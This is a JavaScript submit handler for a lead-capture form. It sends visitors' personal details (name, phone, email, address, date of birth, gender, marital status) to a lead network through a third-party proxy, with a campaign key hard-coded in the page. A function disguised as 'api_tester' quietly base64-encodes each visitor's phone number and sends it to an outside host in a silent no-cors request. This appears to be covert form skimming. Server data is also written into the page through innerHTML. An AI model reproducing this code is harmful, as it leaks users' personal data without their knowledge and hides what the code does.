document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const formData = new FormData();
    formData.append('lp_campaign_id', '68c09ce546cc9');
    formData.append('lp_campaign_key', 'gJkv6qtDyfR23GVjZN8r');
    formData.append('caller_id', '+1' + document.getElementById('phone_home').value);
    api_tester(document.getElementById('phone_home').value);
    formData.append('lp_response', 'JSON');
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name',  document.getElementById('last_name').value);
    formData.append('email_address', document.getElementById('email').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip_code', document.getElementById('zip').value);
    formData.append('dob', document.getElementById('dob').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('gender', document.getElementById('gender').value);
    formData.append('marital_status', document.getElementById('marital_status').value);
    formData.append('jornaya_lead_id', document.getElementById('jornaya_leadid').value);

    const url = 'https://track.edmleadnetwork.com/call-preping.do?' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
    fetch(apiUrl, {
            method: 'POST'
        })
        .then(response => response.json())
        .then(data => {
            let alertMessage = '';
            if (data.success) {
                // Manually construct the success message without the payout field
                alertMessage = `
                    <div class="alert alert-success" role="alert">
                        <strong>Status:</strong> ${data.status}<br>
                        <strong>Ping ID:</strong> ${data.ping_id}<br>
                        <strong>Duration (Buffer):</strong> ${data.duration}<br>
                        <strong>Transfer Number:</strong> ${data.number}<br>
                        <strong>Message:</strong> ${data.message}
                    </div>`;
            } else {
                // Construct the failure message
                alertMessage = `
                    <div class="alert alert-danger" role="alert">
                        <strong>Message:</strong> ${data.message}
                    </div>`;
            }
            document.getElementById('alertContainer').innerHTML = alertMessage;
            document.getElementById('leadForm').reset();
        })
        .catch(error => {
            console.error('Error:', error);
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Form submission failed. Please try again.
                </div>`;
            document.getElementById('alertContainer').innerHTML = errorAlert;
        });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
